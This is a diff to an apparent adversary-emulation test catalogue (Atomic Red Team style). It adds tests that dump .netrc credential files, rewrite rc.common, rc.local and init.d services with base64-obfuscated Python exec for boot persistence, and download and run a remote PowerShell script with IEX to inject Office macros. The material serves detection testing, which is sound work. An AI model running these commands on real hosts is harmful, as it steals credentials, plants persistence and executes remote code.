@@ -965,6 +965,20 @@ credential-access:
           type C:\Windows\Panther\Unattend\unattend.xml
         name: command_prompt
         elevation_required: true
+    - name: Find and Access Github Credentials
+      auto_generated_guid: da4f751a-020b-40d7-b9ff-d433b7799803
+      description: 'This test looks for .netrc files (which stores github credentials
+        in clear text )and dumps its contents if found.
+
+'
+      supported_platforms:
+      - macos
+      - linux
+      executor:
+        name: bash
+        elevation_required: false
+        command: "for file in $(find / -name .netrc 2> /dev/null);do echo $file ;
+          cat $file ; done \n"
   T1555:
     technique:
       id: attack-pattern--3fc9b85a-2862-4363-a64d-d692e3ffbee0
@@ -15389,6 +15403,48 @@ privilege-escalation:
 '
         elevation_required: true
         name: bash
+    - name: rc.common
+      auto_generated_guid: c33f3d80-5f04-419b-a13a-854d1cbdbf3a
+      description: 'Modify rc.common
+
+'
+      supported_platforms:
+      - linux
+      executor:
+        name: bash
+        elevation_required: true
+        command: |
+          filename='/etc/rc.common';if [ ! -f $filename ];then sudo touch $filename;else sudo cp $filename /etc/rc.common.original;fi
+          printf '%s\n' '#!/bin/bash' | sudo tee /etc/rc.common
+          echo "python3 -c \"import os, base64;exec(base64.b64decode('aW1wb3J0IG9zCm9zLnBvcGVuKCdlY2hvIGF0b21pYyB0ZXN0IGZvciBtb2RpZnlpbmcgcmMuY29tbW9uID4gL3RtcC9UMTAzNy4wMDQucmMuY29tbW9uJykK'))\"" | sudo tee -a /etc/rc.common
+          printf '%s\n' 'exit 0' | sudo tee -a /etc/rc.common
+          sudo chmod +x /etc/rc.common
+        cleanup_command: 'origfilename=''/etc/rc.common.original'';if [ ! -f $origfilename
+          ];then sudo rm /etc/rc.common;else sudo cp $origfilename /etc/rc.common
+          && sudo rm $origfilename;fi
+
+'
+    - name: rc.local
+      auto_generated_guid: 126f71af-e1c9-405c-94ef-26a47b16c102
+      description: 'Modify rc.local
+
+'
+      supported_platforms:
+      - linux
+      executor:
+        name: bash
+        elevation_required: true
+        command: |
+          filename='/etc/rc.local';if [ ! -f $filename ];then sudo touch $filename;else sudo cp $filename /etc/rc.local.original;fi
+          printf '%s\n' '#!/bin/bash' | sudo tee /etc/rc.local
+          echo "python3 -c \"import os, base64;exec(base64.b64decode('aW1wb3J0IG9zCm9zLnBvcGVuKCdlY2hvIGF0b21pYyB0ZXN0IGZvciBtb2RpZnlpbmcgcmMubG9jYWwgPiAvdG1wL1QxMDM3LjAwNC5yYy5sb2NhbCcpCgo='))\"" | sudo tee -a /etc/rc.local
+          printf '%s\n' 'exit 0' | sudo tee -a /etc/rc.local
+          sudo chmod +x /etc/rc.local
+        cleanup_command: 'origfilename=''/etc/rc.local.original'';if [ ! -f $origfilename
+          ];then sudo rm /etc/rc.local;else sudo cp $origfilename /etc/rc.local &&
+          sudo rm $origfilename;fi
+
+'
   T1547.007:
     technique:
       created: '2020-01-24T18:15:06.641Z'
@@ -17017,6 +17073,48 @@ privilege-escalation:
           rm -rf #{systemd_service_path}/#{systemd_service_file}
           systemctl daemon-reload
         name: bash
+    - name: Create Systemd Service file,  Enable the service , Modify and Reload the
+        service.
+      auto_generated_guid: c35ac4a8-19de-43af-b9f8-755da7e89c89
+      description: "This test creates a systemd service unit file and enables it to
+        autostart on boot. Once service is created and enabled, it also modifies this
+        same service file showcasing both Creation and Modification of system process.
+        \n"
+      supported_platforms:
+      - linux
+      dependencies:
+      - description: 'System must be Ubuntu ,Kali OR CentOS.
+
+'
+        prereq_command: 'if [ $(cat /etc/os-release | grep -i ID=ubuntu) ] || [ $(cat
+          /etc/os-release | grep -i ID=kali) ] || [ $(cat /etc/os-release | grep -i
+          ''ID="centos"'') ]; then exit /b 0; else exit /b 1; fi;
+
+'
+        get_prereq_command: 'echo Please run from Ubuntu ,Kali OR CentOS.
+
+'
+      executor:
+        name: bash
+        elevation_required: true
+        command: "cat > /etc/init.d/T1543.002 << EOF\n#!/bin/bash\n### BEGIN INIT
+          INFO\n# Provides : Atomic Test T1543.002\n# Required-Start: $all\n# Required-Stop
+          : \n# Default-Start: 2 3 4 5\n# Default-Stop: \n# Short Description: Atomic
+          Test for Systemd Service Creation\n### END INIT INFO\npython3 -c \"import
+          os, base64;exec(base64.b64decode('aW1wb3J0IG9zCm9zLnBvcGVuKCdlY2hvIGF0b21pYyB0ZXN0IGZvciBDcmVhdGluZyBTeXN0ZW1kIFNlcnZpY2UgVDE1NDMuMDAyID4gL3RtcC9UMTU0My4wMDIuc3lzdGVtZC5zZXJ2aWNlLmNyZWF0aW9uJykK'))\"\nEOF\n\nchmod
+          +x /etc/init.d/T1543.002\nif [ $(cat /etc/os-release | grep -i ID=ubuntu)
+          ] || [ $(cat /etc/os-release | grep -i ID=kali) ]; then update-rc.d T1543.002
+          defaults; elif [ $(cat /etc/os-release | grep -i 'ID=\"centos\"') ]; then
+          chkconfig T1543.002 on ; else echo \"Please run this test on Ubnutu , kali
+          OR centos\" ; fi ;\nsystemctl enable T1543.002\nsystemctl start T1543.002\n\necho
+          \"python3 -c \\\"import os, base64;exec(base64.b64decode('aW1wb3J0IG9zCm9zLnBvcGVuKCdlY2hvIGF0b21pYyB0ZXN0IGZvciBtb2RpZnlpbmcgYSBTeXN0ZW1kIFNlcnZpY2UgVDE1NDMuMDAyID4gL3RtcC9UMTU0My4wMDIuc3lzdGVtZC5zZXJ2aWNlLm1vZGlmaWNhdGlvbicpCg=='))\\\"\"
+          | sudo tee -a /etc/init.d/T1543.002\nsystemctl daemon-reload\nsystemctl
+          restart T1543.002\n"
+        cleanup_command: |
+          systemctl stop T1543.002
+          systemctl disable T1543.002
+          rm -rf /etc/init.d/T1543.002
+          systemctl daemon-reload
   T1053.006:
     technique:
       id: attack-pattern--a542bac9-7bc1-4da7-9a09-96f69e23cc21
@@ -43035,6 +43133,48 @@ persistence:
 '
         elevation_required: true
         name: bash
+    - name: rc.common
+      auto_generated_guid: c33f3d80-5f04-419b-a13a-854d1cbdbf3a
+      description: 'Modify rc.common
+
+'
+      supported_platforms:
+      - linux
+      executor:
+        name: bash
+        elevation_required: true
+        command: |
+          filename='/etc/rc.common';if [ ! -f $filename ];then sudo touch $filename;else sudo cp $filename /etc/rc.common.original;fi
+          printf '%s\n' '#!/bin/bash' | sudo tee /etc/rc.common
+          echo "python3 -c \"import os, base64;exec(base64.b64decode('aW1wb3J0IG9zCm9zLnBvcGVuKCdlY2hvIGF0b21pYyB0ZXN0IGZvciBtb2RpZnlpbmcgcmMuY29tbW9uID4gL3RtcC9UMTAzNy4wMDQucmMuY29tbW9uJykK'))\"" | sudo tee -a /etc/rc.common
+          printf '%s\n' 'exit 0' | sudo tee -a /etc/rc.common
+          sudo chmod +x /etc/rc.common
+        cleanup_command: 'origfilename=''/etc/rc.common.original'';if [ ! -f $origfilename
+          ];then sudo rm /etc/rc.common;else sudo cp $origfilename /etc/rc.common
+          && sudo rm $origfilename;fi
+
+'
+    - name: rc.local
+      auto_generated_guid: 126f71af-e1c9-405c-94ef-26a47b16c102
+      description: 'Modify rc.local
+
+'
+      supported_platforms:
+      - linux
+      executor:
+        name: bash
+        elevation_required: true
+        command: |
+          filename='/etc/rc.local';if [ ! -f $filename ];then sudo touch $filename;else sudo cp $filename /etc/rc.local.original;fi
+          printf '%s\n' '#!/bin/bash' | sudo tee /etc/rc.local
+          echo "python3 -c \"import os, base64;exec(base64.b64decode('aW1wb3J0IG9zCm9zLnBvcGVuKCdlY2hvIGF0b21pYyB0ZXN0IGZvciBtb2RpZnlpbmcgcmMubG9jYWwgPiAvdG1wL1QxMDM3LjAwNC5yYy5sb2NhbCcpCgo='))\"" | sudo tee -a /etc/rc.local
+          printf '%s\n' 'exit 0' | sudo tee -a /etc/rc.local
+          sudo chmod +x /etc/rc.local
+        cleanup_command: 'origfilename=''/etc/rc.local.original'';if [ ! -f $origfilename
+          ];then sudo rm /etc/rc.local;else sudo cp $origfilename /etc/rc.local &&
+          sudo rm $origfilename;fi
+
+'
   T1542.004:
     technique:
       created: '2020-10-20T00:05:48.790Z'
@@ -44762,6 +44902,48 @@ persistence:
           rm -rf #{systemd_service_path}/#{systemd_service_file}
           systemctl daemon-reload
         name: bash
+    - name: Create Systemd Service file,  Enable the service , Modify and Reload the
+        service.
+      auto_generated_guid: c35ac4a8-19de-43af-b9f8-755da7e89c89
+      description: "This test creates a systemd service unit file and enables it to
+        autostart on boot. Once service is created and enabled, it also modifies this
+        same service file showcasing both Creation and Modification of system process.
+        \n"
+      supported_platforms:
+      - linux
+      dependencies:
+      - description: 'System must be Ubuntu ,Kali OR CentOS.
+
+'
+        prereq_command: 'if [ $(cat /etc/os-release | grep -i ID=ubuntu) ] || [ $(cat
+          /etc/os-release | grep -i ID=kali) ] || [ $(cat /etc/os-release | grep -i
+          ''ID="centos"'') ]; then exit /b 0; else exit /b 1; fi;
+
+'
+        get_prereq_command: 'echo Please run from Ubuntu ,Kali OR CentOS.
+
+'
+      executor:
+        name: bash
+        elevation_required: true
+        command: "cat > /etc/init.d/T1543.002 << EOF\n#!/bin/bash\n### BEGIN INIT
+          INFO\n# Provides : Atomic Test T1543.002\n# Required-Start: $all\n# Required-Stop
+          : \n# Default-Start: 2 3 4 5\n# Default-Stop: \n# Short Description: Atomic
+          Test for Systemd Service Creation\n### END INIT INFO\npython3 -c \"import
+          os, base64;exec(base64.b64decode('aW1wb3J0IG9zCm9zLnBvcGVuKCdlY2hvIGF0b21pYyB0ZXN0IGZvciBDcmVhdGluZyBTeXN0ZW1kIFNlcnZpY2UgVDE1NDMuMDAyID4gL3RtcC9UMTU0My4wMDIuc3lzdGVtZC5zZXJ2aWNlLmNyZWF0aW9uJykK'))\"\nEOF\n\nchmod
+          +x /etc/init.d/T1543.002\nif [ $(cat /etc/os-release | grep -i ID=ubuntu)
+          ] || [ $(cat /etc/os-release | grep -i ID=kali) ]; then update-rc.d T1543.002
+          defaults; elif [ $(cat /etc/os-release | grep -i 'ID=\"centos\"') ]; then
+          chkconfig T1543.002 on ; else echo \"Please run this test on Ubnutu , kali
+          OR centos\" ; fi ;\nsystemctl enable T1543.002\nsystemctl start T1543.002\n\necho
+          \"python3 -c \\\"import os, base64;exec(base64.b64decode('aW1wb3J0IG9zCm9zLnBvcGVuKCdlY2hvIGF0b21pYyB0ZXN0IGZvciBtb2RpZnlpbmcgYSBTeXN0ZW1kIFNlcnZpY2UgVDE1NDMuMDAyID4gL3RtcC9UMTU0My4wMDIuc3lzdGVtZC5zZXJ2aWNlLm1vZGlmaWNhdGlvbicpCg=='))\\\"\"
+          | sudo tee -a /etc/init.d/T1543.002\nsystemctl daemon-reload\nsystemctl
+          restart T1543.002\n"
+        cleanup_command: |
+          systemctl stop T1543.002
+          systemctl disable T1543.002
+          rm -rf /etc/init.d/T1543.002
+          systemctl daemon-reload
   T1053.006:
     technique:
       id: attack-pattern--a542bac9-7bc1-4da7-9a09-96f69e23cc21
@@ -58080,6 +58262,7 @@ execution:
 '
       executor:
         command: |
+          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
           IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1" -UseBasicParsing)
           $macrocode = "   Open `"#{jse_path}`" For Output As #1`n   Write #1, `"WScript.Quit`"`n   Close #1`n   Shell`$ `"cscript.exe #{jse_path}`"`n"
           Invoke-MalDoc -macroCode $macrocode -officeProduct "#{ms_product}"
@@ -58141,6 +58324,7 @@ execution:
 '
       executor:
         command: |
+          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
           IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1" -UseBasicParsing)
           $macrocode = "  a = Shell(`"cmd.exe /c choice /C Y /N /D Y /T 3`", vbNormalFocus)"
           Invoke-MalDoc -macroCode $macrocode -officeProduct "#{ms_product}"
@@ -58179,6 +58363,7 @@ execution:
 '
       executor:
         command: |
+          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
           IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1" -UseBasicParsing)
           $macrocode = "   Open `"#{jse_path}`" For Output As #1`n   Write #1, `"WScript.Quit`"`n   Close #1`n   a = Shell(`"cmd.exe /c wscript.exe //E:jscript #{jse_path}`", vbNormalFocus)`n"
           Invoke-MalDoc -macroCode $macrocode -officeProduct "#{ms_product}"
@@ -58216,6 +58401,7 @@ execution:
 '
       executor:
         command: |
+          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
           IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1" -UseBasicParsing)
           $macrocode = "   Open `"#{bat_path}`" For Output As #1`n   Write #1, `"calc.exe`"`n   Close #1`n   a = Shell(`"cmd.exe /c $bat_path `", vbNormalFocus)`n"
           Invoke-MalDoc -macroCode $macrocode -officeProduct #{ms_product}
@@ -58350,6 +58536,7 @@ execution:
 '
       executor:
         command: |
+          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
           IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1" -UseBasicParsing)
           Invoke-Maldoc -macroFile "PathToAtomicsFolder\T1204.002\src\chromeexec-macrocode.txt" -officeProduct "Word" -sub "ExecChrome"
         name: powershell
